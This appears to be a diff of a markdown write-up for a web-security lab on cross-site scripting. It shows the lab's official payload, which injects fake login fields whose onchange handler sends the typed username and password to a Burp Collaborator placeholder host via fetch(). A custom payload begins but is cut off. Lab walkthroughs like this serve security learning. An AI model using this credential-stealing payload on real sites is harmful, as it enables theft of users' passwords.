@@ -40,9 +40,9 @@
 - **Tool Used:** Browser (Alternative method — no Burp Professional required)
 
 ### Official Payload (Requires Burp Collaborator — Burp Professional only)
-<input name=username id=username>
+" <input name=username id=username>
 <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
-method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
+method:'POST', mode: 'no-cors', body:username.value+':'+this.value });"> "
 
 ### My Custom Crafted Payload (Without Burp Professional)
 <input type="text" name="username">
